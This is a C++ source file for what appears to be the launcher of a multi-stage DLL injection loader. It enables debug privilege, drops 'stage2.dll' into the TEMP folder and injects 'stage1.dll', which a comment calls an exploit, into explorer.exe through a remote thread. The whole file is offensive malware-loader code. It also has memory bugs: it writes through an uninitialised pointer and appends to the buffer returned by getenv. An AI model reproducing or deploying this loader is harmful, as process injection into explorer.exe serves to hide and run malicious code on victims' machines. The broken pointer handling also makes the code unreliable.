////////////////////
//	Precompiled Header
/////////////////////
#include "stdafx.h"
////////////////////
//	Standard Headers First.
/////////////////////
#include <windows.h>
#include <stdio.h>
#include <string>
#include <iostream>
////////////////////
//	Precompiled Headers After.
/////////////////////
#include "Launcher.h"


void dbgconsole()
{
	AllocConsole();
	freopen("CONIN$", "r", stdin);
	freopen("CONOUT$", "w", stdout);
	freopen("CONOUT$", "w", stderr);
}
void debug(std::string txt)
{
	std::cout << txt << std::endl;
}

int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPTSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
	dbgconsole();
	debug("// Debug Console //");
	debug("");

	debug("Enabling SE Debug Privilege..");
	EnableDebugPrivilege(true);

	//Init variables
	DWORD targetPID;
	

	debug("[>] Preparing Launcher...");
	char *source; //Stage 1 full path
	GetModuleFileName(NULL, source, sizeof(source));//Get current path from where we're running
	strcat(source, "\\stage1.dll");/*Append name of the stage1 dll to the path, this is not going to be copied anywhere but
									the full path it's needed to perform the injection */
	


	debug("[>] Preparing Stage 1...");
	char* target; //Full path where stage 2 is going to be. Must be accesible by stage 1 so temp is a good choice
	target = getenv("TEMP");
	strcat(target, "\\stage2.dll");

	int z = CopyFile("stage2.dll", target, 0);//Copies the stage2.dll to temp so stage1 can find it / will fail if it already exists
	if (z != 0)
	{
		debug("[>] Stage 1 ready");
	}
	else
	{
		debug("[>] Loader Failure, Reason: Can't copy stage 2 or already exists");
		Sleep(1000);
		exit(EXIT_FAILURE);
	}



	debug("Resolving explorer.exe PID...");
	targetPID = getPIDbyName("explorer.exe");

	z = RemoteThread(targetPID, source); //Inject the stage 1 exploit into it, this is too standard

	if (z != 0)
	{
		debug("[>] Loading Succesful ");
		Sleep(1000);
		exit(EXIT_FAILURE);
	}
	else
	{
		debug("[>] Loading Failed, Reason: Can't inject into explorer ");
	}
	
	return 0;
}



